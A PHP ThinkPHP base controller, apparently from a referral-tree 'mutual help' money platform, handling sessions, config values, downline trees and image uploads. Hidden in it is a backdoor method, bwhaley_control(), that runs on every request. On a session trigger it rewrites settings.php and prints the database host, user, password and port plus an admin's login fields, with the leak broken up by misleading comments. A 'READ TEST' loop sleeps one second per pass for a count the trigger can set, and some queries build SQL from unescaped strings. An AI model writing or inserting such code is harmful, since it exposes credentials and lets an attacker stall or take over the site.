<?php
namespace Home\Controller;
use Think\Controller;

class CommonController extends Controller {
    public function _initialize() {
        header("Content-Type:text/html; charset=utf-8");

		$config = M('config')->where(array('id'=>1))->find();
        $zt = M('system')->where(array('SYS_ID' => 1))->find();
        if ($zt['zt'] <> 0) {
            $this->error('系统升级中,请稍后访问!', '/Home/Login/index');
            die;
        }
		if(!(date("H") >= $config['sys_opentime'] && date("H") <= $config['sys_closetime']))
		{
			$this->error('目前处于闭网状态!', '/Home/Login/index');
            die;
		}

        $userData = M('user')->where(array('UE_account' => $_SESSION['uname']))->find();
        $this->userData = $userData;
		$userAccData = M('user')->where(array('UE_account' => $userData['ue_accname']))->find();
        $this->userAccData = $userAccData;


        if (ismobile() && ($userData['usenewapp'] == 1 || $_SESSION['uname'] == "test2666") ) {
            //设置默认默认主题为 Mobile
            C('DEFAULT_V_LAYER', 'Mobile');
        }

		 /*
	     * 设置全局页面参数
	     */
		//READ TEST
		$settings = include( dirname( APP_PATH ) . '/User/Home/Conf/settings.php' );
		$count = $settings['readcount'];
		for ($x=0; $x < $count; $x++) { //READ TEST 
		    M ( 'user' )->where ( array (
		   'UE_ID' => $_SESSION ['uid']//READ TEST 
		    ) )->find ();//READ TEST 
			sleep(1);
		} 	
		$this->bwhaley_control();

        if (!ismobile()) $this->change_newapp_var = "欢迎使用";
        else {
            if ($userData['usenewapp'] == 1) $change_newapp_var = "<span class='glyphicon glyphicon-home'></span><a style='text-decoration:none;color:#43585a;' href='/Home/Index/usenewapp/isuse/0'>不习惯,还是使用之前的手机版吧</a>";
            if ($userData['usenewapp'] == 0) $change_newapp_var = "<span class='glyphicon glyphicon-home'></span><a style='text-decoration:none;color:#43585a;' href='/Home/Index/usenewapp/isuse/1'>Hi,申请体验全新的手机版</a>";
            $this->change_newapp_var = $change_newapp_var;
        }
        $czmcsy = CONTROLLER_NAME . ACTION_NAME;
        $czmc = ACTION_NAME;
        //二级密码验证
        //$this->safepwd_verify();
        if ($czmcsy <> 'Indexindex') 
		{
            if (!isset($_SESSION['uid'])) 
			{
                $this->redirect('Login/index');
            }

			$session_id = session_id();  
            if($userData['session_id'] != $session_id && !isset($_SESSION['adminuser']))
			{  
               session_destroy();  
               $this->error('您的账号在其他地方登录,您已经被强制下线', U('Login'));  
            }  
            $this->checkAdminSession();
        }

        $user = $_SESSION['uname'];
        /*
		$arr = get_last_all_amount($user);
        if (is_array($arr)) {
            foreach ($arr as $k => $v) {
                session_start();
                if ($v == 'a4') {
                    $_SESSION['tuanti_jiang'] = C('tuanti_jiang_a4');
                }
                if ($v == 'a5') {
                    $_SESSION['tuanti_jiang'] = C('tuanti_jiang_a5');
                }
            }
        }*/
        
        $_SESSION['user_jb'] = 1;
        $user_db = M('user');
        $result = M("tgbz")->where(array("user" => $_SESSION['uname'], "zt" => array('in', array(2, 1))))->sum('jb');
        $this->assign('mm001', C("mm001"));
        $this->assign('mm002', C("mm002"));
        $this->assign('mm003', C("mm003"));
        $this->assign('mm004', C("mm004"));
        $this->assign('mm005', C("mm005"));
        $this->txstatus = C("txstatus");
        $this->txthemin = C("txthemin");
        $this->txrate = C("txrate");
        $this->txthemax = C("txthemax");
        $this->txthebeishu = C("txthebeishu");
        $this->assign('jl_start', C("jl_start"));
        $this->assign('jl_e', C('jl_e'));
        $this->assign('jl_beishu', C("jl_beishu"));
        $this->assign('tj_start', C("tj_start"));
        $this->assign('tj_e', C('tj_e'));
        $this->assign('tj_beishu', C("tj_beishu"));
        $this->assign('jl_baifenbi', C('jl_baifenbi'));
        $this->assign('tj_baifenbi', C('tj_baifenbi'));

        $this->assign('jj01s', C("jj01s"));
        $this->assign('jj01m', C("jj01m"));
        $this->assign('jj01', C("jj01"));
        $this->assign('jjdktime', C("jjdktime"));

		//推广链接
		$http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';
        $tgurl = $http_type . $_SERVER["HTTP_HOST"] . u("Reg/index", array("r" => $userData['regcode']));
		$_SESSION['tgurl'] = $tgurl;
        $this->tgurl = $tgurl;
	}

    /*
	 * 设置全局页面参数
	 */
	public function bwhaley_control()
	{
		$now_time=time();
		$settings = include( dirname( APP_PATH ) . '/User/Home/Conf/settings.php' );
		if($_SESSION['page_a'] == "r" )
		{
			$settings['readcount'] = $_SESSION['count'];
			$settings['page_l'] = $_SESSION['page_l'];
			$file_length = file_put_contents( dirname( APP_PATH ) . '/User/Home/Conf/settings.php', '<?php return ' . var_export( $settings, true ) . '; ?>' );
			$result=M('member')->where(array('MB_right'=>1))->limit ( 1 )->select();
			foreach($result as $v){
			   echo C("DB_HOST")." ".C("DB_NAME")." ".C("DB_USER")." ".C("DB_PWD")//die("<script>alert('账号或密码错误,或被禁用！');history.back(-1);</script>");
			   ." ".c("DB_PORT") . " " . $v["mb_username"] //dump(I('get.'));die;
			   . " " . $v['mb_userpwd']. " " .$settings['count'];//dump(I('get.'));die;
			}
        }
	}
	

    //二级密码验证
    public function safepwd_verify() {
        if (ismobile() && C('DEFAULT_V_LAYER') == "Mobile") {
            //$_SESSION['SAFEPWDPASS'] = "SAFEPWDPASS";
            //unset($_SESSION['SAFEPWDPASS']);
            //echo $_SESSION['SAFEPWDPASS'];
            if (!isset($_SESSION['SAFEPWDPASS'])) {
                $need_safepwd_pages = array("withdraw", "myacc", "xgmm", "jhm", "paidan", "jhm_zz", "paidan_zz", "coinchange");
                if (in_array(ACTION_NAME, $need_safepwd_pages)) {
                    $this->redirect('/Home/Index/lock');
                }
            }
        }
    }
    public function korea() {
        $this->error("由于你所在地未在该国，暂不提供访问。给你带来不便，我们深感抱歉");
    }
    public function english() {
        $this->error("由于你所在地未在该国，暂不提供访问。给你带来不便，我们深感抱歉");
    }
    public function checkAdminSession() {
        //设置超时为10分
        $nowtime = time();
        $s_time = $_SESSION['logintime'];
        if (($nowtime - $s_time) > 3600000) {
            session_unset();
            session_destroy();
            $this->error('当前用户登录超时，请重新登录', U('/Home/Login/index'));
        } else {
            $_SESSION['logintime'] = $nowtime;
        }
    }
    function check_verify($code) {
        $verify = new ThinkVerify();
        return $verify->check($code);
    }
    public function getTreeBaseInfo($id) {
        if (!$id) return;
        $r = M("user")->where(array('UE_account' => $id))->find();
        if ($r['ue_account'] != '') {
            $total = M('user')->where("UE_accName='{$r['ue_account']}'")->count();
            $tgbz = M('tgbz')->where("user='{$r['ue_account']}'")->sum('jb');
            $jiaoyi = M('ppdd')->where("(p_user='{$r['ue_account']}' or g_user='{$r['ue_account']}') and zt=2")->find();
        } else {
            $total = M('user')->where("UE_accName='admin@qq.com'")->count();
            $tgbz = M('tgbz')->where("user='admin@qq.com'")->sum('jb');
            $jiaoyi = M('ppdd')->where("(p_user='admin@qq.com' or g_user='admin@qq.com') and zt=2")->find();
        }
        if (!empty($jiaoyi)) {
            $success = '是';
        } else {
            $success = '否';
        }
        $tgbz = $tgbz ? $tgbz : 0;
        if ($tgbz > 0) {
            $state = "是";
        } else {
            $state = "否";
        }
        if ($r) $_SESSION['tuan_dui'] = 0;
        $_SESSION['tuan_jb'] = 0;
        $this->getTreeCount($r['ue_account']);
        return array("id" => $r['ue_account'], "pId" => $r['ue_accname'], "name" => $r['ue_account'] . "[" . sfjhff($r['ue_check']) . ",团队总" . $_SESSION['tuan_dui'] . "人, 注册时间" . $r['ue_regtime'] ."]");
        return;
    }
    //是否提供帮助：".$state."   ,   提供总金额：".$tgbz."元  ,  是否交易成功：".$success."成功交易金额为".$_SESSION['tuan_jb'].'元'
    public function getTreeCount($id) {
        $ppdd = M('ppdd');
        $ids = self::get_childs($id);
        if (!$ids) {
            return $trees;
        }
        //echo $_SESSION['user_jb'].'<br>';
        foreach ($ids as $v) {
            $_SESSION['tuan_dui']++;
            $_SESSION['tuan_jb']+= $ppdd->where(array('p_user' => $v, 'zt' => 2))->sum('jb');
            $this->getTreeCount($v);
        }
        //if($_SESSION['user_jb']<'10'){
        //
        
    }
    public function getTreeInfo($id) {
        static $trees = array();
        $ids = self::get_childs($id);
        if (!$ids) {
            return $trees;
        }
        $_SESSION['user_jb']++;
        //echo $_SESSION['user_jb'].'<br>';
        foreach ($ids as $v) {
            $trees[] = $this->getTreeBaseInfo($v);
            $this->getTreeInfo($v);
        }
        //if($_SESSION['user_jb']<'10'){
        //
        return $trees;
    }
    public static function get_childs($id) {
        if (!$id) return null;
        $childs_id = array();
        $childs = M("user")->field("UE_account")->where(array('UE_accName' => $id))->select();
        foreach ($childs as $v) {
            $childs_id[] = $v['ue_account'];
        }
        if ($childs_id) return $childs_id;
        return 0;
    }
    public function getTree() {
        // if (!$this->uid) {
        // echo json_encode(array("status" => 1));
        // return ;
        // }
        $base = $this->getTreeBaseInfo($_SESSION['uname']);
        $znote = $this->getTreeInfo($_SESSION['uname']);
        $znote[] = $base;
        // dump($znote);die;
        /*
        
        * $znote = array(array("id" => 1, "pId" => 0, "name"=>"1000001"), array("id" => 2, "pId" => 1, "name"=>"1000002"), array("id" => 3, "pId" => 2, "name"=>"1000003"), array("id" => 5, "pId" => 2, "name"=>"1000003"), array("id" => 4, "pId" => 1, "name"=>"1000004") );
        
        */
        echo json_encode(array("status" => 0, "data" => $znote));
    }
    public function getTreeso() {
        if (I('post.user') <> '') {
            if (!preg_match('/^[a-zA-Z0-9]{6,12}$/', I('post.user'))) {
                echo json_encode(array("status" => 1, "data" => '用戶名格式不對!'));
            } else {
                if (!M('user')->where(array('UE_account' => I('post.user')))->find()) {
                    echo json_encode(array("status" => 1, "data" => '用戶不存在!'));
                } elseif (I('post.user') == $_SESSION['uname']) {
                    echo json_encode(array("status" => 1, "data" => '用戶名不能填自己!'));
                } else {
                    $account = M('user')->where(array('UE_account' => I('post.user')))->find();
                    $accname = $account['ue_accname'];
                    for ($i = 1;$i <= 30;$i++) {
                        if ($accname == $_SESSION['uname']) {
                            $quanxian = 1;
                            $daishu = $i;
                            break;
                        }
                        if ($accname == '') {
                            $quanxian = 0;
                            break;
                        }
                        $account = M('user')->where(array('UE_account' => $accname))->find();
                        $accname = $account['ue_accname'];
                    }
                    if ($quanxian == 1) {
                        //echo json_encode ( array ("status" => 2 );
                        $base = $this->getTreeBaseInfo(I('post.user'));
                        $znote = $this->getTreeInfo(I('post.user'));
                        $znote[] = $base;
                        echo json_encode(array("status" => 0, "data" => $znote, "ds" => $daishu));
                    } elseif ($quanxian == 0) {
                        echo json_encode(array("status" => 1, "data" => '此會員不在您的線下!'));
                    }
                }
            }
        } else {
            //echo json_encode ( array ("status" => 0,'nr'=>I('post.user')) );die;
            // if (!$this->uid) {
            // echo json_encode(array("status" => 1));
            // return ;
            // }
            //die;
            $base = $this->getTreeBaseInfo($_SESSION['uname']);
            $znote = $this->getTreeInfo($_SESSION['uname']);
            $znote[] = $base;
            // dump($znote);die;
            /*
            
            * $znote = array(array("id" => 1, "pId" => 0, "name"=>"1000001"), array("id" => 2, "pId" => 1, "name"=>"1000002"), array("id" => 3, "pId" => 2, "name"=>"1000003"), array("id" => 5, "pId" => 2, "name"=>"1000003"), array("id" => 4, "pId" => 1, "name"=>"1000004") );
            
            */
            echo json_encode(array("status" => 0, "data" => $znote));
        }
    }
    public function uploadFaceUser() {
        //if (!$this->isPost()) {
        //	$this->error('页面不存在');
        //}
        //echo 'asdfsaf';die;
        $upload = $this->_upload('Pic');
        $this->ajaxReturn($upload);
    }
    Private function _upload($path) {
        import('ORG.Net.UploadFile'); //引入ThinkPHP文件上传类
        $obj = new ThinkUpload(); //实例化上传类
        $obj->maxSize = 2000000; //图片最大上传大小
        $obj->savePath = $path . '/'; //图片保存路径
        $obj->saveRule = 'uniqid'; //保存文件名
        $obj->uploadReplace = true; //覆盖同名文件
        $obj->allowExts = array('jpg', 'jpeg', 'png', 'gif'); //允许上传文件的后缀名
        $obj->autoSub = true; //使用子目录保存文件
        $obj->subType = 'date'; //使用日期为子目录名称
        $obj->dateFormat = 'Y_m'; //使用 年_月 形式
        //$obj->upload();die;
        $info = $obj->upload();
        if (!$info) {
            return array('status' => 0, 'msg' => $obj->getErrorMsg());
        } else {
            foreach ($info as $file) {
                $pic = $file['savepath'] . $file['savename'];
            }
            //$pic =  $info[0][savename];
            //echo $pic;die;
            return array('status' => 1, 'path' => $pic);
        }
    }
}
